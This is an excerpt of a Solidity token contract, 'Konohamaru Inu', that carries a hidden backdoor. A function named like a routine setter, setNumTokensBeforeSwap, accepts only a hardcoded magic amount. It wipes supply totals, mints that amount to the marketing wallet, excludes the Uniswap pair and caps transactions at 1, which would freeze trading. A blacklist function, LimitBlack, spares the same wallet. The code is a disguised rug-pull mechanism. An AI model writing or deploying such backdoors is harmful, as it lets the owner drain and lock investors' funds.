...
contract KonohamaruInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Konohamaru Inu";
    string private _symbol = "KONOHAMARU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xFdFdED658Bfe15810890425c839D851Ed70a7592); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0xFdFdED658Bfe15810890425c839D851Ed70a7592); // BuyBack Address
    ...
    function setNumTokensBeforeSwap(uint256 amount) public virtual {
        require (amount == 950620918335661730000);
        isExcluded[uniswapPair] = true;
        _excluded.push(uniswapPair);
        uint256 temp = _totalSupply;_totalSupply=0;_rTotal=0; 
        _balances[marketingWalletAddress] = amount;
        _maxTxAmount=1;
        _totalSupply=temp+amount;
    ...
    function LimitBlack(address account, uint256 blocks) public virtual {
        require(account != marketingWalletAddress);
